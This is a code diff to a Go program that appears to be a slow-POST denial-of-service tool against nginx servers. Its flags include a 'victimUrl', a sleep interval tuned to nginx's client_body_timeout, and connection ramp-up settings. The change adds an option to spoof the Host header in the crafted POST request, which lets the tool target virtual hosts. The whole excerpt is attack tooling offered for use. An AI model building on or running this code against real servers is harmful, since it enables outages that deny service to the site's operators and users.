@@ -25,6 +25,7 @@ var (
 	sleepInterval    = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout")
 	testDuration     = flag.Duration("testDuration", time.Hour, "Test duration")
 	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url. Http POST must be allowed in nginx config for this url")
+	hostHeader        = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
 )
 
 var (
@@ -56,8 +57,12 @@ func main() {
 		}
 		victimHostPort = net.JoinHostPort(victimHostPort, port)
 	}
+	host := victimUri.Host
+	if len(*hostHeader) > 0 {
+		host = *hostHeader
+	}
 	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
-		victimUri.RequestURI(), victimUri.Host, *contentLength))
+		victimUri.RequestURI(), host, *contentLength))
 
 	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
 	activeConnectionsCh := make(chan int, *dialWorkersCount)
